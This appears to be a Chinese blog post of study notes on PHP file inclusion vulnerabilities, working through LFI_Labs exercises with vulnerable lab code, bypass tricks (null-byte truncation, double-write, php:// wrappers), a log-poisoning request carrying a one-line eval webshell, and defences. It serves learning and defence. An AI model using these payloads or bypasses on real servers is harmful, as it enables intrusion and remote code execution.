@@ -1,0 +1,422 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>文件包含漏洞 | Flyme</title>
+  <meta name="author" content="西伯利亚狼">
+  
+  <meta name="description" content="奋斗小青年的逆袭之路一直进行中">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="文件包含漏洞"/>
+  <meta property="og:site_name" content="Flyme"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Flyme" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Flyme</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 文件包含漏洞</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="File-Inclusion-文件包含漏洞-概述"><a href="#File-Inclusion-文件包含漏洞-概述" class="headerlink" title="File Inclusion(文件包含漏洞)概述"></a>File Inclusion(文件包含漏洞)概述</h1><a id="more"></a>
+
+<p>文件包含，是一个功能。在各种开发语言中都提供了<code>内置的文件包含函数</code>，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：</p>
+<ul>
+<li>include(),include_once()</li>
+<li>require(),require_once()</li>
+</ul>
+<p>这些文件包含函数，这些函数在代码设计中被经常使用到。</p>
+<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个<strong>变量</strong>，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
+<p><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p>
+<p><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>
+<p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
+<h1 id="B站视频学习记录"><a href="#B站视频学习记录" class="headerlink" title="B站视频学习记录"></a>B站视频学习记录</h1><p>##1、 什么是文件包含漏洞</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602112553701.png" alt="image-20200602112553701"></p>
+<p>##2、 文件包含函数</p>
+<ul>
+<li>include</li>
+<li>include_once</li>
+<li>require</li>
+<li>require_once</li>
+<li>highlight_file/show_source/readfile/fopen/file/file_get_contents</li>
+</ul>
+<p>##3、 文件包含漏洞分析</p>
+<ul>
+<li>本地文件包含</li>
+<li>远程文件包含</li>
+</ul>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602113404147.png" alt="image-20200602113404147"></p>
+<h2 id="4、文件包含利用方式"><a href="#4、文件包含利用方式" class="headerlink" title="4、文件包含利用方式"></a>4、文件包含利用方式</h2><h3 id="1、伪协议"><a href="#1、伪协议" class="headerlink" title="1、伪协议"></a>1、伪协议</h3><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602113836299.png" alt="image-20200602113836299"></p>
+<h3 id="2、00截断"><a href="#2、00截断" class="headerlink" title="2、00截断"></a>2、00截断</h3><h3 id="3、长度截断（windows：256-；-linux：4096）"><a href="#3、长度截断（windows：256-；-linux：4096）" class="headerlink" title="3、长度截断（windows：256 ； linux：4096）"></a>3、长度截断（windows：256 ； linux：4096）</h3><h3 id="4、包含日志文件"><a href="#4、包含日志文件" class="headerlink" title="4、包含日志文件"></a>4、包含日志文件</h3><p><strong>包含日志文件获取webshell</strong></p>
+<p>这里使用的是绝对路径，为了演示，没用相对路径</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602212450904.png" alt="image-20200602212450904"></p>
+<p>此时我们写句<code> &lt;?php phpinfo(); ?&gt;</code>,看到服务器返回的是禁止访问，并没有执行，我们再看下日志文件，发现这段代码被url编码了，故而没有是运行</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602212856279.png" alt="image-20200602212856279"></p>
+<p>现在我们用burpsuite来改包试一下，</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602214304112.png" alt="image-20200602214304112"></p>
+<p>此时在浏览器中再次执行第一次的动作，就能运行之前的的php代码了，因为通过burpsuite在日志文件中完整编码的，绕过浏览器的url编码的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;LFI-1&#x2F;&lt;?php @eval($_POST[wlk]); ?&gt; HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5、包含session"><a href="#5、包含session" class="headerlink" title="5、包含session"></a>5、包含session</h3><h2 id="5-文件包含漏洞的防御"><a href="#5-文件包含漏洞的防御" class="headerlink" title="5 文件包含漏洞的防御"></a>5 文件包含漏洞的防御</h2><ul>
+<li><p>php中使用<code>open_basedir</code>配置限制访问在指定的区域</p>
+</li>
+<li><p>过滤 .（点） / （反斜杠） \ （反斜杠）</p>
+</li>
+<li><p>禁止服务器远程文件包含</p>
+</li>
+<li><p>尽量不要使用动态包含，可以在需要包含的页面固定写好    </p>
+</li>
+</ul>
+<p><strong><em>RFI</em>(远程文件包含)和<em>LFI</em>（本地文件包含漏洞）</strong></p>
+<h2 id="php-filter-非常重要"><a href="#php-filter-非常重要" class="headerlink" title="php://filter(非常重要)"></a>php://filter(非常重要)</h2><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602222614728.png" alt="image-20200602222614728"></p>
+<p><code>http://www.lfi.com/LFI-1/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602224823092.png" alt="image-20200602224823092"></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602224755733.png" alt="image-20200602224755733"></p>
+<h2 id="7-php-input命令执行及其获取webshell"><a href="#7-php-input命令执行及其获取webshell" class="headerlink" title="7 php_input命令执行及其获取webshell"></a>7 php_input命令执行及其获取webshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file, &quot;php:&#x2F;&#x2F;filter&quot;) || stristr($file, &quot;phar:&#x2F;&#x2F;&quot;) || stristr($file, &quot;zip:&#x2F;&#x2F;&quot;) || stristr($file, &quot;data:&quot;))&#123;</span><br><span class="line">    exit(&#39;hacket!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">    if($file!&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)  echo &quot;tips:flag在当前目录的其他位置&quot;;</span><br><span class="line">    include($file);   &#x2F;&#x2F;对应我们在hackbar中的post数据</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;click go baidu&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603001455308.png" alt="image-20200603001455308"></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603002248372.png" alt="image-20200603002248372"></p>
+<p>webshell的获取</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603002512676.png" alt="image-20200603002512676"></p>
+<h2 id="8-php压缩协议获取webshell"><a href="#8-php压缩协议获取webshell" class="headerlink" title="8 php压缩协议获取webshell"></a>8 php压缩协议获取webshell</h2><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003609066.png" alt="image-20200603003609066"></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003504345.png" alt="image-20200603003504345"></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003459676.png" alt="image-20200603003459676"></p>
+<p>这里使用菜单反而无法实现，因为代码的原因在后面自动添加了.php，所以我们在浏览器中需要将.php去掉。如下所示</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603003857054.png" alt="image-20200603003857054"></p>
+<h2 id="9-php-data协议获取webshell"><a href="#9-php-data协议获取webshell" class="headerlink" title="9 php-data协议获取webshell"></a>9 php-data协议获取webshell</h2><p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603004526194.png" alt="image-20200603004526194"></p>
+<h2 id="10、利用操作系统的特性绕过"><a href="#10、利用操作系统的特性绕过" class="headerlink" title="10、利用操作系统的特性绕过"></a>10、利用操作系统的特性绕过</h2><p>可以利用windows下文件名最多包含256个字符的特点，我们就用文件名+<code>.</code>超过256就行了 </p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200603005104123.png" alt="image-20200603005104123"></p>
+<h1 id="LFI-Labs学习记录"><a href="#LFI-Labs学习记录" class="headerlink" title="LFI_Labs学习记录"></a>LFI_Labs学习记录</h1><h2 id="LFI01"><a href="#LFI01" class="headerlink" title="LFI01"></a>LFI01</h2><p><strong>绝对路径</strong></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602161549381.png" alt="image-20200602161549381"></p>
+<p><strong>相对路径 ： ../   表示回到上一层</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们在<code>.php</code>和<code>.txt</code>文件中写入<code>phpinfo()</code>,查看情况</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602162349436.png" alt="image-20200602162349436"></p>
+<p>我们发现，即使文件类型是txt类型的，但是里面包含了php代码，照样是可以运行的，所以与文件类型无关的</p>
+<h2 id="LFI02——-00截断"><a href="#LFI02——-00截断" class="headerlink" title="LFI02——**%00截断**"></a>LFI02——**%00截断**</h2><p>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line">&lt;!-- from http:&#x2F;&#x2F;www.ush.it&#x2F;2009&#x2F;02&#x2F;08&#x2F;php-filesystem-attack-vectors&#x2F; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;library\&quot;, appends .php to end, escape with NULL byte %00&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-2&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;library&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&quot;includes&#x2F;&quot;.$_GET[&#39;library&#39;].&quot;.php&quot;); </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用第一关的方法是无效 的，比如我们是<code>?library=c:\\wlk.txt</code>，经过代码后，变成了<code>includes/c:\\wlk.txt.php</code>但是没有这个文件即将会失败</p>
+<p><strong>办法</strong></p>
+<p><strong>%00截断</strong>：还是上面的例子，<code>?library=c:\\wlk.txt%00</code>   =&gt;  <code>includes/c:\\wlk.txt00.php</code>(十六进制是00)   =&gt; <code>includes/c:\\wlk.txt .php</code>(有个空格),于是系统认为文件是``includes/c:\wlk.txt`, 空格.php就不解析了</p>
+<p>但是这里面使用<code>?library=c:\\wlk.txt%00</code>还不行，因为我们的文件是在<code>c:\\wlk.txt·</code>,而不是在<code>includes/c:\\wlk.txt</code>下,故我们使用相对路径来解决这个问题</p>
+<h2 id="LFI03-点加斜杠绕过"><a href="#LFI03-点加斜杠绕过" class="headerlink" title="LFI03-点加斜杠绕过"></a>LFI03-点加斜杠绕过</h2><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- from http:&#x2F;&#x2F;www.ush.it&#x2F;2009&#x2F;02&#x2F;08&#x2F;php-filesystem-attack-vectors&#x2F; --&gt;</span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;file\&quot;, looks for .php at end - bypass by apending &#x2F;. (slash plus dot)&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-3&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;file&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (substr($_GET[&#39;file&#39;], -4, 4) !&#x3D; &#39;.php&#39;)  &#x2F;&#x2F; 从结尾倒数第四个开始，取4个长度</span><br><span class="line"> echo file_get_contents($_GET[&#39;file&#39;]);</span><br><span class="line">else</span><br><span class="line"> echo &#39;You are not allowed to see source files!&#39;.&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602172218555.png" alt="image-20200602172218555"></p>
+<p>我们发现在根目录下使用<code>.php</code>文件将会是失败的，刚好对应上面的源码</p>
+<p>我们看一下在windows下使用<code>.和/</code>来给文件添加名字</p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602172841338.png" alt="image-20200602172841338"></p>
+<p>使用斜杠是，提示我们不能使用<code>\/:*?&quot;&lt;&gt;|</code></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602172930373.png" alt="image-20200602172930373"></p>
+<p><strong>使用<code>.</code></strong></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602173240437.png" alt="image-20200602173240437"></p>
+<p>使用<code>/</code></p>
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602173334831.png" alt="image-20200602173334831"></p>
+<h2 id="LFI04-（去掉后缀名绕过）"><a href="#LFI04-（去掉后缀名绕过）" class="headerlink" title="LFI04-（去掉后缀名绕过）"></a>LFI04-（去掉后缀名绕过）</h2><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- from http:&#x2F;&#x2F;www.ush.it&#x2F;2009&#x2F;02&#x2F;08&#x2F;php-filesystem-attack-vectors&#x2F; --&gt;</span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;class\&quot;, appends .php to end, defeat with NULL byte %00&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-4&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;class&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include(&#39;includes&#x2F;class_&#39;.addslashes($_GET[&#39;class&#39;]).&#39;.php&#39;);  &#x2F;&#x2F;addslashes转义一些字符 ，可以看到它给我们的文件加上了后缀名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LFI05-双写绕过"><a href="#LFI05-双写绕过" class="headerlink" title="LFI05-双写绕过"></a>LFI05-双写绕过</h2><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- from http:&#x2F;&#x2F;hakipedia.com&#x2F;index.php&#x2F;Local_File_Inclusion --&gt;</span><br><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the GET parameter \&quot;file\&quot;, strips prepended \&quot;..&#x2F;\&quot; strings, must encode &#x2F; with %2f&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-5&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;file&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   $file &#x3D; str_replace(&#39;..&#x2F;&#39;, &#39;&#39;, $_GET[&#39;file&#39;]);  &#x2F;&#x2F; 过滤了..&#x2F;</span><br><span class="line">   if(isset($file))</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;pages&#x2F;$file&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;index.php&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602181507963.png" alt="image-20200602181507963"></p>
+<h2 id="LFI06"><a href="#LFI06" class="headerlink" title="LFI06"></a>LFI06</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     include(&quot;..&#x2F;common&#x2F;header.php&quot;);   ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- from https:&#x2F;&#x2F;pentesterlab.com&#x2F;exercises&#x2F;php_include_and_post_exploitation&#x2F;course --&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php hint(&quot;will include the arg specified in the POST parameter \&quot;page\&quot;&quot;);  ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;LFI-6&#x2F;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;page&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include($_POST[&quot;page&quot;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里使用的是<code>POST</code>方式传数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/image-20200602183608333.png" alt="image-20200602183608333"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00截断： escape with NULL byte %00</span><br><span class="line">    </span><br><span class="line">点+斜杠绕过</span><br><span class="line">    </span><br><span class="line">去掉后缀名绕过</span><br><span class="line">    </span><br><span class="line">双写绕过    比如过滤了..&#x2F;</span><br><span class="line">    </span><br><span class="line">文件包含shell</span><br><span class="line">    </span><br><span class="line">包含日志文件获取webshell</span><br><span class="line"></span><br><span class="line">php_filter获取flag</span><br><span class="line"></span><br><span class="line">php_input命令执行及获取webshell</span><br><span class="line">    </span><br><span class="line">php压缩协议获取webshell</span><br><span class="line">   </span><br><span class="line">php-data协议获取webshell</span><br><span class="line">    </span><br><span class="line">利用操作系统特性进行文件包含</span><br></pre></td></tr></table></figure>
+
+<h2 id="日志目录"><a href="#日志目录" class="headerlink" title="日志目录"></a><strong>日志目录</strong></h2><p><strong>日志默认目录</strong></p>
+<ul>
+<li><code>apache+Linux</code>日志默认路径：<code>/etc/httpd/logs/access_log</code>     或者   <code>var/log/httpd/access_log</code></li>
+<li><code>apache + win2003</code>日志默认路径： <code>D:\xampp\apache\logs\access.log</code>     <code>D:\xampp\apache\logs\error.log</code></li>
+<li><code>ISS6.0 + WIN2003</code>默认日志文件： <code>C:\WINDOWS\system32\Logfiles</code></li>
+<li><code>ISS7.0 + WIN2003</code>默认日志文件： <code>%SystemDrive%\inetpub\logs\LogFiles</code></li>
+<li><code>nginx</code>日志文件： 日志文件在用户安装目录logs目录下，例如：安装目录为 <code>/usr/local/nginx</code>，则日志在<code>/usr/local/nginx/logs</code></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/07/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0/" class="leancloud-visitors view" data-flag-title="文件包含漏洞">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/07/15/upload-labs学习记录/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xx","appKey":"xx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
